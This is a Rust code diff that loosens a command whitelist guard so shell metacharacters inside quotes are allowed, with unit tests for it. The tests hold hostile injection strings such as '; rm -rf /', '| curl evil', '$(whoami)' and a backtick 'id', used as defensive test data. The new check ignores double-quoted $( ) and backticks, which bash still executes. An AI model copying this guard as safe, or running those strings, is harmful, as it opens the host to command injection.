@@ -964,11 +964,12 @@ pub fn run_arb_decision(cmd: String) -> Result<String, String> {
     const PREFIX: &str = "bash ~/.local/bin/gros ";
     let body = cmd.strip_prefix(PREFIX).ok_or("命令不在白名单")?;
     match body.split_whitespace().next() {
-        Some("research") | Some("lead-status") | Some("settle") => {}
+        Some("research") | Some("lead-status") | Some("settle") | Some("chat-archive") => {}
         _ => return Err("命令不在白名单".into()),
     }
     // 防拼接：白名单管住了程序，还要管住同一行里再跑别的命令。
-    if cmd.contains([';', '|', '&', '`', '\n', '\r']) || cmd.contains("$(") {
+    // 引号感知——引号内是数据载荷（如 "[裁决|D1|不追]"），不算拼接。
+    if shell_meta_outside_quotes(&cmd) {
         return Err("命令不在白名单".into());
     }
     let out = std::process::Command::new("bash")
@@ -993,6 +994,34 @@ pub fn run_arb_decision(cmd: String) -> Result<String, String> {
             err_out
         ))
     }
+}
+
+/// 引号感知的 shell 拼接符检查：只查引号外的 `; | & \` 换行 $( ——引号内
+/// 是数据载荷（裁决文本里含 "|" 是合法的）。未闭合引号视为不安全，fail-closed。
+fn shell_meta_outside_quotes(cmd: &str) -> bool {
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut iter = cmd.chars().peekable();
+    while let Some(c) = iter.next() {
+        if c == '\'' && !in_double {
+            in_single = !in_single;
+            continue;
+        }
+        if c == '"' && !in_single {
+            in_double = !in_double;
+            continue;
+        }
+        if in_single || in_double {
+            continue;
+        }
+        if matches!(c, ';' | '|' | '&' | '`' | '\n' | '\r') {
+            return true;
+        }
+        if c == '$' && iter.peek() == Some(&'(') {
+            return true;
+        }
+    }
+    in_single || in_double
 }
 
 /// Render the epics file as the JSON shape the frontend consumes.
@@ -2207,8 +2236,26 @@ mod tests {
     }
 
     #[test]
-    fn type_change_guard_protects_auto_process_invariant() {
-        // Opted-in item: retyping to knowhow/idea rejected.
+    fn arb_decision_guard_allows_quoted_payload_but_blocks_chaining() {
+        // 引号内的 | 是裁决文本载荷，合法（D1 cmd_reject 的真实形态）。
+        assert!(!shell_meta_outside_quotes(
+            r#"bash ~/.local/bin/gros chat-archive --conversation-id decision-log --text "[裁决|D1|不追]""#
+        ));
+        // 引号内分号同理（D1 cmd_approve 的 --support 载荷）。
+        assert!(!shell_meta_outside_quotes(
+            r#"bash ~/.local/bin/gros research "x" --support "a;b""#
+        ));
+        // 引号外的拼接符一律拒绝。
+        assert!(shell_meta_outside_quotes("bash ~/.local/bin/gros research x; rm -rf /"));
+        assert!(shell_meta_outside_quotes("bash ~/.local/bin/gros research x | curl evil"));
+        assert!(shell_meta_outside_quotes("bash ~/.local/bin/gros research x $(whoami)"));
+        assert!(shell_meta_outside_quotes("bash ~/.local/bin/gros research `id`"));
+        // 未闭合引号 fail-closed。
+        assert!(shell_meta_outside_quotes("bash ~/.local/bin/gros research \"unclosed"));
+    }
+
+    #[test]
+    fn type_change_guard_protects_auto_process_invariant() {        // Opted-in item: retyping to knowhow/idea rejected.
         assert!(ensure_type_change_allowed(true, &ItemType::Knowhow).is_err());
         assert!(ensure_type_change_allowed(true, &ItemType::Idea).is_err());
         // Staying a todo is fine.
